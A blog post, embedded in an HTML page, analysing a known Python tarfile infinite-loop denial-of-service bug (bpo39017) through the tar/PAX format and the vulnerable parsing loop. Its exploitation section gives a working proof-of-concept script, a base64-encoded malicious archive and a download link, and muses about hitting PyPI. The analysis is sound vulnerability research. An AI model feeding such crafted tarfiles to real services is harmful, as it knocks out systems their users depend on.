@@ -1,0 +1,605 @@
+<!doctype html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<title>Python tarfile infinite loop DoS</title>
+		<meta name="description" content="I am writing about my experiences as a naval navel-gazer.">
+		<link rel="alternate" href="/feed/feed.xml" type="application/atom+xml" title="ℬ㏒.㎈ℓℯℛ.ⓧⓨℤ">
+		<link rel="alternate" href="/feed/feed.json" type="application/json" title="ℬ㏒.㎈ℓℯℛ.ⓧⓨℤ">
+		
+		<style>/**
+ * okaidia theme for JavaScript, CSS and HTML
+ * Loosely based on Monokai textmate theme by http://www.monokai.nl/
+ * @author ocodia
+ */
+
+code[class*="language-"],
+pre[class*="language-"] {
+	color: #f8f8f2;
+	background: none;
+	text-shadow: 0 1px rgba(0, 0, 0, 0.3);
+	font-family: Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace;
+	font-size: 1em;
+	text-align: left;
+	white-space: pre;
+	word-spacing: normal;
+	word-break: normal;
+	word-wrap: normal;
+	line-height: 1.5;
+
+	-moz-tab-size: 4;
+	-o-tab-size: 4;
+	tab-size: 4;
+
+	-webkit-hyphens: none;
+	-moz-hyphens: none;
+	-ms-hyphens: none;
+	hyphens: none;
+}
+
+/* Code blocks */
+pre[class*="language-"] {
+	padding: 1em;
+	margin: .5em 0;
+	overflow: auto;
+	border-radius: 0.3em;
+}
+
+:not(pre) > code[class*="language-"],
+pre[class*="language-"] {
+	background: #272822;
+}
+
+/* Inline code */
+:not(pre) > code[class*="language-"] {
+	padding: .1em;
+	border-radius: .3em;
+	white-space: normal;
+}
+
+.token.comment,
+.token.prolog,
+.token.doctype,
+.token.cdata {
+	color: #8292a2;
+}
+
+.token.punctuation {
+	color: #f8f8f2;
+}
+
+.token.namespace {
+	opacity: .7;
+}
+
+.token.property,
+.token.tag,
+.token.constant,
+.token.symbol,
+.token.deleted {
+	color: #f92672;
+}
+
+.token.boolean,
+.token.number {
+	color: #ae81ff;
+}
+
+.token.selector,
+.token.attr-name,
+.token.string,
+.token.char,
+.token.builtin,
+.token.inserted {
+	color: #a6e22e;
+}
+
+.token.operator,
+.token.entity,
+.token.url,
+.language-css .token.string,
+.style .token.string,
+.token.variable {
+	color: #f8f8f2;
+}
+
+.token.atrule,
+.token.attr-value,
+.token.function,
+.token.class-name {
+	color: #e6db74;
+}
+
+.token.keyword {
+	color: #66d9ef;
+}
+
+.token.regex,
+.token.important {
+	color: #fd971f;
+}
+
+.token.important,
+.token.bold {
+	font-weight: bold;
+}
+.token.italic {
+	font-style: italic;
+}
+
+.token.entity {
+	cursor: help;
+}
+/*
+ * New diff- syntax
+ */
+
+pre[class*="language-diff-"] {
+	--eleventy-code-padding: 1.25em;
+	padding-left: var(--eleventy-code-padding);
+	padding-right: var(--eleventy-code-padding);
+}
+.token.deleted {
+	background-color: hsl(0, 51%, 37%);
+	color: inherit;
+}
+.token.inserted {
+	background-color: hsl(126, 31%, 39%);
+	color: inherit;
+}
+
+/* Make the + and - characters unselectable for copy/paste */
+.token.prefix.unchanged,
+.token.prefix.inserted,
+.token.prefix.deleted {
+	-webkit-user-select: none;
+	user-select: none;
+	display: inline-flex;
+	align-items: center;
+	justify-content: center;
+	padding-top: 2px;
+	padding-bottom: 2px;
+}
+.token.prefix.inserted,
+.token.prefix.deleted {
+	width: var(--eleventy-code-padding);
+	background-color: rgba(0,0,0,.2);
+}
+
+/* Optional: full-width background color */
+.token.inserted:not(.prefix),
+.token.deleted:not(.prefix) {
+	display: block;
+	margin-left: calc(-1 * var(--eleventy-code-padding));
+	margin-right: calc(-1 * var(--eleventy-code-padding));
+	text-decoration: none; /* override del, ins, mark defaults */
+	color: inherit; /* override del, ins, mark defaults */
+}
+* { box-sizing: border-box; }
+/* Defaults */
+:root {
+	--font-family: -apple-system, system-ui, sans-serif;
+	--font-family-monospace: Consolas, Menlo, Monaco, Andale Mono WT, Andale Mono, Lucida Console, Lucida Sans Typewriter, DejaVu Sans Mono, Bitstream Vera Sans Mono, Liberation Mono, Nimbus Mono L, Courier New, Courier, monospace;
+}
+
+/* Theme colors */
+:root {
+	--color-gray-20: #e0e0e0;
+	--color-gray-50: #C0C0C0;
+	--color-gray-90: #333;
+
+	--background-color: #fff;
+
+	--text-color: var(--color-gray-90);
+	--text-color-link: #082840;
+	--text-color-link-active: #5f2b48;
+	--text-color-link-visited: #17050F;
+
+	--syntax-tab-size: 2;
+
+	--pinyin-font: 'Arima Madurai';
+}
+
+@media (prefers-color-scheme: dark) {
+	:root {
+		--color-gray-20: #e0e0e0;
+		--color-gray-50: #C0C0C0;
+		--color-gray-90: #dad8d8;
+
+		/* --text-color is assigned to --color-gray-_ above */
+		--text-color-link: #1493fb;
+		--text-color-link-active: #6969f7;
+		--text-color-link-visited: #a6a6f8;
+
+		--background-color: #15202b;
+	}
+}
+
+
+/* Global stylesheet */
+* {
+	box-sizing: border-box;
+}
+
+html,
+body {
+	padding: 0;
+	margin: 0 auto;
+	font-family: var(--font-family);
+	color: var(--text-color);
+	background-color: var(--background-color);
+}
+html {
+	overflow-y: scroll;
+}
+body {
+	max-width: 55em;
+}
+
+/* https://www.a11yproject.com/posts/how-to-hide-content/ */
+.visually-hidden {
+	clip: rect(0 0 0 0);
+	clip-path: inset(50%);
+	height: 1px;
+	overflow: hidden;
+	position: absolute;
+	white-space: nowrap;
+	width: 1px;
+}
+
+p:last-child {
+	margin-bottom: 0;
+}
+p {
+	line-height: 1.5;
+}
+
+li {
+	line-height: 1.5;
+}
+
+a[href] {
+	color: var(--text-color-link);
+}
+a[href]:visited {
+	color: var(--text-color-link-visited);
+}
+a[href]:hover,
+a[href]:active {
+	color: var(--text-color-link-active);
+}
+
+main {
+	padding: 1rem;
+}
+main :first-child {
+	margin-top: 0;
+}
+
+header {
+	border-bottom: 1px dashed var(--color-gray-20);
+}
+header:after {
+	content: "";
+	display: table;
+	clear: both;
+}
+
+.links-nextprev {
+	list-style: none;
+	border-top: 1px dashed var(--color-gray-20);
+	padding: 1em 0;
+}
+
+table {
+	margin: 1em 0;
+}
+table td,
+table th {
+	padding-right: 1em;
+}
+
+pre,
+code {
+	font-family: var(--font-family-monospace);
+}
+pre:not([class*="language-"]) {
+	margin: .5em 0;
+	line-height: 1.375; /* 22px /16 */
+	-moz-tab-size: var(--syntax-tab-size);
+	-o-tab-size: var(--syntax-tab-size);
+	tab-size: var(--syntax-tab-size);
+	-webkit-hyphens: none;
+	-ms-hyphens: none;
+	hyphens: none;
+	direction: ltr;
+	text-align: left;
+	white-space: pre;
+	word-spacing: normal;
+	word-break: normal;
+}
+code {
+	word-break: break-all;
+}
+p > code {
+	color: #722;
+	text-decoration: underline #7222;
+}
+
+/* Header */
+header {
+	display: flex;
+	gap: 1em .5em;
+	flex-wrap: wrap;
+	align-items: center;
+	padding: 1em;
+}
+.home-link {
+	font-size: 1em; /* 16px /16 */
+	font-weight: 700;
+	margin-right: 2em;
+}
+.home-link:link:not(:hover) {
+	text-decoration: none;
+}
+
+/* Nav */
+.nav {
+	display: flex;
+	padding: 0;
+	margin: 0;
+	list-style: none;
+}
+.nav-item {
+	display: inline-block;
+	margin-right: 1em;
+}
+.nav-item a[href]:not(:hover) {
+	text-decoration: none;
+}
+.nav a[href][aria-current="page"] {
+	text-decoration: underline;
+}
+
+/* Posts list */
+.postlist {
+	list-style: none;
+	padding: 0;
+	padding-left: 1.5rem;
+}
+.postlist-item {
+	display: flex;
+	flex-wrap: wrap;
+	align-items: baseline;
+	counter-increment: start-from -1;
+	margin-bottom: 1em;
+}
+.postlist-item:before {
+	display: inline-block;
+	pointer-events: none;
+	content: "" counter(start-from, decimal-leading-zero) ". ";
+	line-height: 100%;
+	text-align: right;
+	margin-left: -1.5rem;
+}
+.postlist-date,
+.postlist-item:before {
+	font-size: 0.8125em; /* 13px /16 */
+	color: var(--color-gray-90);
+}
+.postlist-date {
+	word-spacing: -0.5px;
+}
+.postlist-link {
+	font-size: 1.1875em; /* 19px /16 */
+	font-weight: 700;
+	flex-basis: calc(100% - 1.5rem);
+	padding-left: .25em;
+	padding-right: .5em;
+	text-underline-position: from-font;
+	text-underline-offset: 0;
+	text-decoration-thickness: 1px;
+}
+.postlist-item-active .postlist-link {
+	font-weight: bold;
+}
+
+/* Tags */
+.post-tag {
+	display: inline-flex;
+	align-items: center;
+	justify-content: center;
+	text-transform: capitalize;
+	font-style: italic;
+}
+.postlist-item > .post-tag {
+	align-self: center;
+}
+
+/* Tags list */
+.post-metadata {
+	display: inline-flex;
+	flex-wrap: wrap;
+	gap: .5em;
+	list-style: none;
+	padding: 0;
+	margin: 0;
+}
+.post-metadata time {
+	margin-right: 1em;
+}
+
+/* Direct Links / Markdown Headers */
+.header-anchor {
+	text-decoration: none;
+	font-style: normal;
+	font-size: 1em;
+	margin-left: .1em;
+}
+a[href].header-anchor,
+a[href].header-anchor:visited {
+	color: transparent;
+}
+a[href].header-anchor:focus,
+a[href].header-anchor:hover {
+	text-decoration: underline;
+}
+a[href].header-anchor:focus,
+:hover > a[href].header-anchor {
+	color: #aaa;
+}
+
+h2 + .header-anchor {
+	font-size: 1.5em;
+}
+
+.pyin {
+	font-family: var(--pinyin-font), cursive;
+}
+
+figure {
+	margin: -1.7em 0 0.7em 0;
+}
+
+figcaption {
+	font-style: italic;
+}
+
+figure img {
+	border: 1px solid #ccc;
+}</style>
+		<link href="https://fonts.googleapis.com/css2?family=Arima+Madurai:wght@400;700" rel="stylesheet" referrerpolicy="no-referrer">
+	</head>
+	<body>
+		<a href="#skip" class="visually-hidden">Skip to main content</a>
+
+		<header>
+			<a href="/" class="home-link">ℬ㏒.㎈ℓℯℛ.ⓧⓨℤ</a>
+			<nav>
+				<h2 class="visually-hidden">Top level navigation menu</h2>
+				<ul class="nav">
+					<li class="nav-item"><a href="/">Home</a></li>
+					<li class="nav-item"><a href="/blog/">Archive</a></li>
+					<li class="nav-item"><a href="/about/">About Me</a></li>
+				</ul>
+			</nav>
+		</header>
+
+		<main id="skip">
+			
+<h1>Python tarfile infinite loop DoS</h1>
+
+<ul class="post-metadata">
+	<li><time datetime="2020-07-08">2020年07月</time></li>
+	<li><a href="/tags/security/" class="post-tag">security</a>, </li>
+	<li><a href="/tags/python/" class="post-tag">python</a>, </li>
+	<li><a href="/tags/file-format/" class="post-tag">file format</a></li>
+</ul>
+
+<p>The python <code>tarfile</code> module can end up in an infinite loop when opening maliciously malformed tar files.
+I came across Denial of Service bug <a href="https://bugs.python.org/issue39017">bpo39017</a> when browsing the python bug tracker for security issues (I didn't discover this bug myself). The error-reproducing zipfile the reporter uploaded is direct from the fuzzer, but I wanted to understand and isolate the issue by making the smallest tarfile which reproduces the bug.</p>
+<h2 id="tarfile-structure" tabindex="-1">Tarfile structure <a class="header-anchor" href="#tarfile-structure">#</a></h2>
+<p>The name tar is derived from &quot;tape archive&quot; which harks back to its 1979 release to help store multiple files on magnetic tape.
+Tar files are made up of blocks of 512 bytes.
+There's no overall header or central directory: to list files you'll need to scan through the tarfile and read all the header records.
+Any header struct (257 bytes) or content will be padded to the block size, so most of a tarfile will be NULL bytes.
+The header is a bit gross, having integer fields encoded as ASCII digits in octal.</p>
+<h3 id="serious-tarfile-vulnerabilities" tabindex="-1">Serious tarfile vulnerabilities <a class="header-anchor" href="#serious-tarfile-vulnerabilities">#</a></h3>
+<p>The tarfile headers contain the archived filenames. If the filename is an absolute path, some tarfile implementations can be tricked into extracting files to arbitrary locations. Arbitrary write may also be possible when extracting symlinks. The same issues affect other archive formats. This post isn't about these vulnerabilities.</p>
+<h3 id="pax" tabindex="-1">PAX <a class="header-anchor" href="#pax">#</a></h3>
+<p>The bug is in python's <code>tarfile</code> module's processing of PAX header records. PAX is extensions for tar which add properties left out of the original tar header struct, or which don't fit within the fixed size fields defined in times gone by e.g. symlinks, arbitrary resolution timestamps, uids &gt; 2097151, file sizes &gt; 8GB, long filenames. If we want to specify PAX information for a file, we make a fake file with the <code>typeflag</code> in the header record set to <code>x</code> or <code>g</code>. The fake file's content is the extra PAX headers. The next block can contain the normal header record for the file, followed by blocks containing the file contents.</p>
+<p>You can try to make a PAX tarfile: (Without <code>--blocking-factor</code>, each block is some multiple of 512 bytes)</p>
+<pre class="language-bash" tabindex="0"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"myfilecontent"</span> <span class="token operator">></span> myfile
+<span class="token function">tar</span> <span class="token parameter variable">-cf</span> hello.tar <span class="token parameter variable">--format</span><span class="token operator">=</span>pax --blocking-factor<span class="token operator">=</span><span class="token number">1</span> myfile
+hexdump <span class="token parameter variable">-C</span> hello.tar</code></pre>
+<pre class="language-hexdump" tabindex="0"><code class="language-hexdump">00000000  2e 2f 50 61 78 48 65 61  64 65 72 73 2e 31 39 31  |./PaxHeaders.191| # Header for fake file
+00000010  37 37 2f 6d 79 66 69 6c  65 00 00 00 00 00 00 00  |77/myfile.......|
+00000020  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+*
+00000060  00 00 00 00 30 30 30 30  36 34 34 00 30 30 30 30  |....0000644.0000|
+00000070  30 30 30 00 30 30 30 30  30 30 30 00 30 30 30 30  |000.0000000.0000|
+00000080  30 30 30 30 30 36 31 00  30 37 30 33 33 32 34 31  |0000061.07033241|
+00000090  36 30 30 00 30 31 32 31  36 34 00 20 78 00 00 00  |600.012164. x...|
+000000a0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+*
+00000100  00 75 73 74 61 72 00 30  30 00 00 00 00 00 00 00  |.ustar.00.......|
+00000110  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+*
+00000200  31 39 20 61 74 69 6d 65  3d 39 34 36 36 38 34 38  |19 atime=9466848| # PAX header records
+00000210  30 30 0a 33 30 20 63 74  69 6d 65 3d 31 35 39 34  |00.30 ctime=1594|
+00000220  33 34 30 33 32 30 2e 38  30 31 30 37 35 30 36 35  |340320.801075065|
+00000230  0a 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+00000240  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+*
+00000400  6d 79 66 69 6c 65 00 00  00 00 00 00 00 00 00 00  |myfile..........| # File header
+00000410  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+*
+00000460  00 00 00 00 30 30 30 30  36 34 34 00 30 30 30 31  |....0000644.0001|
+00000470  37 35 30 00 30 30 30 31  37 35 30 00 30 30 30 30  |750.0001750.0000|
+00000480  30 30 30 30 30 31 36 00  30 37 30 33 33 32 34 31  |0000016.07033241|
+00000490  36 30 30 00 30 31 31 36  35 30 00 20 30 00 00 00  |600.011650. 0...|
+000004a0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+*
+00000500  00 75 73 74 61 72 00 30  30 62 65 6e 00 00 00 00  |.ustar.00ben....|
+00000510  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+00000520  00 00 00 00 00 00 00 00  00 62 65 6e 00 00 00 00  |.........ben....|
+00000530  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+00000540  00 00 00 00 00 00 00 00  00 30 30 30 30 30 30 30  |.........0000000|
+00000550  00 30 30 30 30 30 30 30  00 00 00 00 00 00 00 00  |.0000000........|
+00000560  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+*
+00000600  6d 79 66 69 6c 65 63 6f  6e 74 65 6e 74 0a 00 00  |myfilecontent...| # File content
+00000610  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+*
+00000c00  # 2 completely NULL blocks added at end</code></pre>
+<p>Notice those <code>*</code> lines which are multiple lines of NULL bytes. 512 = 0x200, so blocks start at 0x0, 0x200, 0x400, 0x600, 0x800, 0xA00.</p>
+<h3 id="pax-headers-structure" tabindex="-1">PAX headers structure <a class="header-anchor" href="#pax-headers-structure">#</a></h3>
+<p>A PAX header record is a UTF-8 encoded string of the format: <code>&quot;%d %s=%s\n&quot;, &lt;length&gt;, &lt;keyword&gt;, &lt;value&gt;</code></p>
+<p>Several of these records can be concatenated.</p>
+<p>The length is the length of the record, including the length field and the ending newline. The keyword cannot contain an equals sign. Standard keywords include 'path' &amp; 'atime'.</p>
+<h2 id="the-bug" tabindex="-1">The bug <a class="header-anchor" href="#the-bug">#</a></h2>
+<p>The <code>length</code> and <code>keyword</code> are extracted with a <a href="https://github.com/python/cpython/blob/b26a0db8ea2de3a8a8e4b40e69fc8642c7d7cb68/Lib/tarfile.py#L1243">regex</a>. That's not the problem. The problem is that the length is not validated and we use the <code>length</code> variable to <a href="https://github.com/python/cpython/blob/b26a0db8ea2de3a8a8e4b40e69fc8642c7d7cb68/Lib/tarfile.py#L1245-L1271">iterate</a>:</p>
+<pre class="language-python" tabindex="0"><code class="language-python">regex <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">br"(\d+) ([^=]+)="</span><span class="token punctuation">)</span>
+pos <span class="token operator">=</span> <span class="token number">0</span>
+<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+    <span class="token keyword">match</span> <span class="token operator">=</span> regex<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> pos<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token keyword">match</span><span class="token punctuation">:</span>
+        <span class="token keyword">break</span>
+
+    length<span class="token punctuation">,</span> keyword <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>groups<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    pos <span class="token operator">+=</span> length</code></pre>
+<p>If <code>length</code> is zero, e.g. if <code>buf</code> contains <code>&quot;0 X=&quot;</code>, we loop forever.</p>
+<h3 id="does-this-affect-other-languages" tabindex="-1">Does this affect other languages? <a class="header-anchor" href="#does-this-affect-other-languages">#</a></h3>
+<p>In the rust crate <a href="https://github.com/alexcrichton/tar-rs/blob/master/src/pax.rs">tar-rs</a>, the block is first split on newline characters. The length field is then checked against the actual length of the record. I didn't see any tarfile documentation that forbids newline characters within a keyword. This library would reject such a record, but that's almost definitely ok. Golang checks that the <a href="https://github.com/golang/go/blob/fae44a2be350940c3b29919e274e9a7e63f22df7/src/archive/tar/strconv.go#L264">length is sensible</a> and then that the record <a href="https://github.com/golang/go/blob/fae44a2be350940c3b29919e274e9a7e63f22df7/src/archive/tar/strconv.go#L270">ends in a newline</a>. Ruby and php seem ok.</p>
+<p>This is probably a python-only bug.</p>
+<h3 id="exploitation" tabindex="-1">Exploitation <a class="header-anchor" href="#exploitation">#</a></h3>
+<p>First we make a 512-byte header block specifying that the following block is PAX information (type is 'x' or 'g'). Then we append <code>&quot;0 X=&quot;</code> for a total of 516 bytes.</p>
+<p>Feed the output file into <code>tarfile.open()</code> or <code>tarfile.is_tarfile()</code> and wait a very long time. Or try <code>pip install recursion.tar</code>. I'd imagine that the pypi server is vulnerable to this, but untrusted tarfiles aren't ingested by too many python services as far as I'm aware.</p>
+<p>Script for minimal reproducing tarfile:</p>
+<pre class="language-python" tabindex="0"><code class="language-python"><span class="token keyword">def</span> <span class="token function">make_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytearray</span><span class="token punctuation">:</span>
+    header <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>
+    header<span class="token punctuation">[</span><span class="token number">0x7c</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x31</span>  <span class="token comment"># size = ASCII '1' (must be > 0)</span>
+    header<span class="token punctuation">[</span><span class="token number">0x94</span><span class="token punctuation">:</span><span class="token number">0x9d</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">b"000630\x00 g"</span>  <span class="token comment"># chksum + typeflag 'g'</span>
+    <span class="token keyword">return</span> header <span class="token operator">+</span> <span class="token string">b"0 X="</span>
+
+
+<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"recursion.tar"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>make_file<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+<h4 id="downloads" tabindex="-1">Downloads <a class="header-anchor" href="#downloads">#</a></h4>
+<ul>
+<li><a href="https://bugs.python.org/file49309/recursion.tar">an evil tarfile</a></li>
+<li>base64 decode this tar.gz <code>H4sICANcB18AA3gAS0pOzMlJLWIYCGCIQ9zAwMjQ1JRBIZ2urhmZwEAhwhYAT1CwIgQCAAA=</code></li>
+</ul>
+
+<ul class="links-nextprev"><li>Previous: <a href="/wo-men-du-bu-wan-mei/">我們都不完美</a></li><li>Next: <a href="/defconsm-car-hacking/">DEFCON:SM Car Hacking</a></li>
+</ul>
+
+		</main>
+
+		<footer></footer>
+
+		<!-- Current page: /python-tarfile-infinite-loop-dos/ -->
+	</body>
+</html>
